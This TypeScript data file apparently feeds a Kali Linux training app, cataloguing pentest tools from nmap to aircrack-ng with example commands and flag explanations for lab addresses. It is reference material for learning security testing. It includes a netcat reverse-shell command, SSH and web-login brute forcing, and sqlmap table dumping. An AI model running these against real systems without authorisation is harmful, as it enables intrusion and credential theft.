import { KaliTool } from "../types";

export const TOOL_CATEGORIES = [
  { name: "Information Gathering", description: "Probing networks and mapping out attack surfaces/active hosts.", iconName: "Eye" },
  { name: "Vulnerability Analysis", description: "Scanning services to locate known configuration errors and security flaws.", iconName: "ShieldAlert" },
  { name: "Web Applications", description: "Fuzzing paths, identifying injection vectors, and testing web apps.", iconName: "Globe" },
  { name: "Database Assessment", description: "Auditing database servers, checking injection access, and pulling schemas.", iconName: "Database" },
  { name: "Password Attacks", description: "Cracking cryptographic hashes and brute-forcing SSH, Web, or FTP portals.", iconName: "KeyRound" },
  { name: "Exploitation Tools", description: "Executing remote payloads, deploying shells, and validating exploits.", iconName: "Terminal" },
  { name: "Sniffing & Spoofing", description: "Intercepting live ethernet traffic, analyzing packets, and active MITM.", iconName: "Radio" },
  { name: "Post Exploitation", description: "Maintaining terminal persistence, file transfer, and pivoting networks.", iconName: "Flag" },
];

export const KALI_TOOLS: KaliTool[] = [
  {
    id: "nmap",
    name: "nmap",
    category: "Information Gathering",
    description: "Network Mapper is a free and open-source utility for network discovery and security auditing. It determines what hosts are online, what services are running, their operating systems, and firewall configurations.",
    iconName: "Eye",
    difficulty: "Beginner",
    practicalApplication: "Conducting initial footprinting on an audit target's IP block to evaluate active, listening ports and verify if firewalls are filtering non-essential services.",
    commands: [
      {
        id: "nmap-basic",
        command: "nmap -sV -sC -T4 10.10.10.15",
        description: "Standard service and script scan",
        purpose: "Identifies open ports, probes them to determine the active service version (`-sV`), and triggers pre-built default scripts (`-sC`) to safely detect simple known vulnerabilities.",
        flags: [
          { flag: "-sV", explanation: "Service version detection. Probes open ports to determine service name and version info." },
          { flag: "-sC", explanation: "Default scripts. Runs safe, useful scripts from the Nmap Scripting Engine (NSE) to fetch system details." },
          { flag: "-T4", explanation: "Schedules aggressive speed timing template (0-5, higher is faster) for network sweeps." }
        ]
      },
      {
        id: "nmap-ping-sweep",
        command: "nmap -sn 192.168.1.0/24",
        description: "Ping Sweep on a subnet",
        purpose: "Checks which IP addresses are online without scanning individual ports, conserving time and stealth.",
        flags: [
          { flag: "-sn", explanation: "Disable port scan. Perform host discovery only (ping sweep)." }
        ]
      },
      {
        id: "nmap-vuln-scan",
        command: "nmap --script vuln 10.10.10.15",
        description: "Vulnerability analysis script scan",
        purpose: "Enables all NSE scripts classified under the 'vuln' category to probe for CVEs (e.g., EternalBlue, Heartbleed) directly.",
        flags: [
          { flag: "--script vuln", explanation: "Runs vulnerability scripts in the Nmap Scripting Engine targeting specific services." }
        ]
      }
    ]
  },
  {
    id: "gobuster",
    name: "gobuster",
    category: "Web Applications",
    description: "Gobuster is a fast, multi-threaded directory and DNS busting tool written in Go. It searches for web endpoints, subdomains, and virtual hosts against custom dictionary files.",
    iconName: "Globe",
    difficulty: "Beginner",
    practicalApplication: "Locating hidden administrative dashboards, unlinked backup files (like `.zip`, `.bak`), or unindexed directories on web assets that are not reachable via normal site navigation.",
    commands: [
      {
        id: "gobuster-dir",
        command: "gobuster dir -u http://10.10.10.15 -w /usr/share/wordlists/dirb/common.txt",
        description: "Directory and file brute-forcer",
        purpose: "Sends thousands of HTTP HEAD requests to map secret path locations on the web server.",
        flags: [
          { flag: "dir", explanation: "Tells gobuster to use classical directory and file enumeration mode." },
          { flag: "-u", explanation: "Target URL of the web server to audit." },
          { flag: "-w", explanation: "Local wordlist file containing thousands of potential directory names to check." }
        ]
      },
      {
        id: "gobuster-ext",
        command: "gobuster dir -u http://10.10.10.15 -w common.txt -x php,txt,html,bak",
        description: "Directory bust with file extension matching",
        purpose: "Scans for actual scripts and backup archives matching specific file extensions on the server.",
        flags: [
          { flag: "-x", explanation: "File extensions list. Appends `.php`, `.txt`, `.html`, and `.bak` to every word in the wordlist." }
        ]
      }
    ]
  },
  {
    id: "hydra",
    name: "hydra",
    category: "Password Attacks",
    description: "Hydra is a parallelized network login hacker that supports numerous protocols (SSH, FTP, HTTP, HTTPS, SMB, VNC, RDP, etc.). It performs incredibly rapid credential stuffing and dictionary attacks.",
    iconName: "KeyRound",
    difficulty: "Intermediate",
    practicalApplication: "Validating remote server resilience against weak passwords or verifying that network device accounts adhere to strict complexity policies.",
    commands: [
      {
        id: "hydra-ssh",
        command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.15 -t 4",
        description: "SSH password dictionary attack",
        purpose: "Attempts to connect to SSH under the user name 'admin' while iterating over thousands of passwords inside the RockYou dictionary, executing with 4 parallel threads.",
        flags: [
          { flag: "-l", explanation: "Specifies a single strict login username (e.g., 'admin')." },
          { flag: "-P", explanation: "Points to a wordlist file loaded with passwords to iterate through." },
          { flag: "-t", explanation: "Thread count. Sets the number of simultaneous active connection requests." }
        ]
      },
      {
        id: "hydra-http-post",
        command: "hydra -l admin -P pass.txt 10.10.10.15 http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=Login failed\"",
        description: "HTTP POST form brute-forcing",
        purpose: "Simulates online password guessing on a standard dynamic web content login page.",
        flags: [
          { flag: "http-post-form", explanation: "Specifies the target protocol is an HTTP POST web form." },
          { flag: "F=Login failed", explanation: "Failure message. Tells Hydra that if this string appears in the HTTP response, the credentials failed." }
        ]
      }
    ]
  },
  {
    id: "sqlmap",
    name: "sqlmap",
    category: "Database Assessment",
    description: "sqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.",
    iconName: "Database",
    difficulty: "Advanced",
    practicalApplication: "Auditing internal e-commerce or customer databases via custom forms to ensure dynamic SQL query constructions are properly parameterized against web-based security bypasses.",
    commands: [
      {
        id: "sqlmap-basic",
        command: "sqlmap -u \"http://10.10.10.15/product.php?id=1\" --dbs",
        description: "Enumerate database names",
        purpose: "Tests if the query parameter `id` is vulnerable to SQL injection, and if successful, lists the databases configured on the back-end DBMS.",
        flags: [
          { flag: "-u", explanation: "Target URL path containing vulnerable query parameters." },
          { flag: "--dbs", explanation: "Directs sqlmap to query and list available schema catalogs on the back-end." }
        ]
      },
      {
        id: "sqlmap-dump",
        command: "sqlmap -u \"http://10.10.10.15/product.php?id=1\" -D target_db -T users --dump",
        description: "Dump table entries",
        purpose: "Extracts database records from a target table, useful in testing data integrity.",
        flags: [
          { flag: "-D", explanation: "Database name targeted for query extraction." },
          { flag: "-T", explanation: "Database table representing critical column entries to dump." },
          { flag: "--dump", explanation: "Instructs sqlmap to read and extract actual values stored in the table and display as a structured grid." }
        ]
      }
    ]
  },
  {
    id: "john",
    name: "john",
    category: "Password Attacks",
    description: "John the Ripper (JTR) is an extremely fast offline password cracker. It auto-detects hash crypt-types (MD5, SHA1, SHA256, bcrypt, etc.) and performs dictionary, rules, and hybrid attacks.",
    iconName: "KeyRound",
    difficulty: "Intermediate",
    practicalApplication: "Cracking cryptographic password hashes leaked from database breaches or system backup dumps to check whether administrators are maintaining complex keys.",
    commands: [
      {
        id: "john-wordlist",
        command: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
        description: "Run dictionary hash crack",
        purpose: "Extracts cryptosystems from `hashes.txt` and tests them against passwords inside the RockYou catalog, displaying match successes.",
        flags: [
          { flag: "--wordlist", explanation: "Links to the dictionary file containing candidates for hashing comparison." }
        ]
      },
      {
        id: "john-show",
        command: "john --show hashes.txt",
        description: "Display cracked credentials",
        purpose: "Reads local cache files and outputs previously cracked human passwords alongside original keys.",
        flags: [
          { flag: "--show", explanation: "Outputs already cracked hashes in plain cleartext format." }
        ]
      }
    ]
  },
  {
    id: "metasploit",
    name: "msfconsole",
    category: "Exploitation Tools",
    description: "The Metasploit Framework is the most widely used penetration testing platform in the world. It provides thousands of modules for finding, exploiting, and validating security vulnerabilities across operating systems.",
    iconName: "Terminal",
    difficulty: "Advanced",
    practicalApplication: "Launching verified payloads against network targets to establish command line access, proving that patch cycles are overdue.",
    commands: [
      {
        id: "msf-console",
        command: "msfconsole",
        description: "Start Metasploit Framework Interactive console",
        purpose: "Launches the rich terminal shell from which testers select, configure, and fire exploits and auxiliary modules.",
        flags: []
      },
      {
        id: "msf-search",
        command: "search eternalblue",
        description: "Search exploit modules within console",
        purpose: "Searches the Metasploit payload database to locate suitable modules matching MS17-010 or EternalBlue vulnerabilities.",
        flags: []
      },
      {
        id: "msf-exploit",
        command: "use exploit/windows/smb/ms17_010_eternalblue",
        description: "Load exploit payload module",
        purpose: "Selects and loads the Microsoft SMB vulnerability exploit, opening up configuration options like RHOSTS and LHOST.",
        flags: []
      }
    ]
  },
  {
    id: "wireshark",
    name: "wireshark",
    category: "Sniffing & Spoofing",
    description: "Wireshark is the world's foremost network protocol analyzer. It lets you capture and interactively browse the traffic running on a computer network in real-time.",
    iconName: "Radio",
    difficulty: "Intermediate",
    practicalApplication: "Deep packet inspection of unencrypted TCP channels (like FTP or HTTP) to parse cleartext credentials or detect rogue beacon sessions initiated by local trojans.",
    commands: [
      {
        id: "tshark-basic",
        command: "tshark -i eth0 -f \"tcp port 80\"",
        description: "Capture HTTP traffic via CLI",
        purpose: "Uses `tshark` (the command-line interface version of Wireshark) to monitor live network activity arriving on port 80.",
        flags: [
          { flag: "-i", explanation: "Network interface to capture. In this case, `eth0` represents the primary wired local adapter." },
          { flag: "-f", explanation: "Packet filter format. Limits the captures specifically to TCP packets on destination port 80." }
        ]
      }
    ]
  },
  {
    id: "netcat",
    name: "nc",
    category: "Post Exploitation",
    description: "Often referred to as the 'Swiss Army Knife' of TCP/IP, Netcat reads and writes data across network connections using TCP or UDP. It's incredibly powerful for shell execution, scanning ports, and pivoting.",
    iconName: "Flag",
    difficulty: "Beginner",
    practicalApplication: "Setting up lightweight, ad-hoc file transfers across networks, or configuring debugging listeners to collect testing log parameters from custom applications.",
    commands: [
      {
        id: "nc-listener",
        command: "nc -lvnp 4444",
        description: "Establish reverse shell listener",
        purpose: "Sets up a local server listening on port 4444. When a compromise target executes a reverse shell back to you, Netcat captures it and yields control.",
        flags: [
          { flag: "-l", explanation: "Puts Netcat in listener mode, awaiting incoming connections." },
          { flag: "-v", explanation: "Enables verbose state feedback, displaying connect events clearly." },
          { flag: "-n", explanation: "Suppresses DNS lookups, keeping speed high and logging tidy." },
          { flag: "-p", explanation: "Ports number constraint. Hooks the listener to bind specifically to port 4444." }
        ]
      },
      {
        id: "nc-send-shell",
        command: "nc 10.10.10.14 4444 -e /bin/bash",
        description: "Launch bash shell to listener",
        purpose: "Initiates a connection back to the listener at `10.10.10.14:4444`, executing and redirecting inputs directly to the local system `/bin/bash` shell.",
        flags: [
          { flag: "-e", explanation: "Program execution parameter. Executes `/bin/bash` and redirects standard IO channels through the network pipe." }
        ]
      }
    ]
  },
  {
    id: "nikto",
    name: "nikto",
    category: "Vulnerability Analysis",
    description: "Nikto is an open-source web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs and outdated server configurations.",
    iconName: "ShieldAlert",
    difficulty: "Intermediate",
    practicalApplication: "Performing non-destructive assessments of hosting configurations to flag critical server misconfigurations (e.g. disabled X-XSS headers or indexing allowed directories).",
    commands: [
      {
        id: "nikto-scan",
        command: "nikto -h http://10.10.10.15 -Tuning 1 2 3",
        description: "General web server configuration sweep",
        purpose: "Probes the target web application, restricting server tuning categories to 1 (Interesting files), 2 (Misconfigurations), and 3 (Information disclosure).",
        flags: [
          { flag: "-h", explanation: "Target Host URL or IP address of the server to be audited." },
          { flag: "-Tuning", explanation: "Filters checks to perform only desired auditing subclasses to decrease execution footprint." }
        ]
      }
    ]
  },
  {
    id: "aircrack-ng",
    name: "aircrack-ng",
    category: "Wireless Attacks",
    description: "Aircrack-ng is a complete suite of tools to assess WiFi network security. It focuses on monitoring, attacking, testing, and cracking WPA-PSK and WPA2-PSK keys.",
    iconName: "Radio",
    difficulty: "Advanced",
    practicalApplication: "Testing enterprise office wireless points for key strength, capture handshake packets, and determine if passwords resist modern dictionary-level brute force attacks.",
    commands: [
      {
        id: "aircrack-crack",
        command: "aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 wpa_handshake.cap",
        description: "Crack WPA/WPA2 handshake",
        purpose: "Attempts WPA/WPA2 cryptographic decryption of captured handshake logs using candidate passwords.",
        flags: [
          { flag: "-w", explanation: "Local candidate wordlist file location." },
          { flag: "-b", explanation: "BSSID filter. Directs the cracking engine towards the strict wireless access point MAC." }
        ]
      }
    ]
  }
];
